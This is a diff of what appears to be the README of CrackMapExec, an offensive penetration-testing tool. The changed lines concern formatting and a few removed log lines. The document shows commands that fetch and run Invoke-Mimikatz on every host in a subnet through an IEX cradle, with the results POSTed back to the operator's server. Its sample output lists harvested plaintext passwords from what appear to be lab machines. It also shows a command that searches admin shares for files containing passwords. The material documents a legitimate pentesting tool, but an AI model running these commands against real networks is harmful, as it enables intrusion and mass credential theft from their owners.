@@ -93,7 +93,7 @@ drugoutcove-pc\administrator
 desktop-qdvnp6b\drugdealer
 ```
 
-Use an IEX cradle to run Invoke-Mimikatz.ps1 on all systems concurrently (PS script gets hosted automatically with an HTTP server),
+Use an IEX cradle to run ```Invoke-Mimikatz.ps1``` on all systems concurrently (PS script gets hosted automatically with an HTTP server),
 Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file and parsed for clear-text credentials:
 ```
 #~ python crackmapexec.py -t 100 172.16.206.0/24 -u username -p password --mimikatz
@@ -108,18 +108,15 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 172.16.206.133 - - [19/Aug/2015 18:57:45] "POST / HTTP/1.1" 200 -
 [+] 172.16.206.133 Found plain text creds! Domain: drugoutcove-pc Username: drugdealer Password: IloveMETH!@$
 [*] 172.16.206.133 Saved POST data to Mimikatz-172.16.206.133-2015-08-19_18:57:45.log
-[+] 172.16.206.133:445 DRUGOUTCOVE-PC Executed specified command via SMBEXEC
 172.16.206.130 - - [19/Aug/2015 18:57:47] "POST / HTTP/1.1" 200 -
 [*] 172.16.206.130 Saved POST data to Mimikatz-172.16.206.130-2015-08-19_18:57:47.log
-[+] 172.16.206.130:445 DESKTOP-QDVNP6B Executed specified command via SMBEXEC
 172.16.206.132 - - [19/Aug/2015 18:57:48] "POST / HTTP/1.1" 200 -
 [+] 172.16.206.132 Found plain text creds! Domain: drugcompany-PC Username: drugcompany Password: IloveWEED!@#
 [+] 172.16.206.132 Found plain text creds! Domain: DRUGCOMPANY-PC Username: drugdealer Password: D0ntDoDrugsKIDS!@#
 [*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
-[+] 172.16.206.132:445 DRUGCOMPANY-PC Executed specified command via SMBEXEC
 ``` 
 
-Lets Spider the C$ share starting from the Users folder for the word 'password' in all files and directories (concurrently):
+Lets Spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
 ```
 #~ python crackmapexec.py -t 150 172.16.206.0/24 -u 'Administrator' -p 'crackmeumofo' --spider Users --depth 10 --pattern password
 [+] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
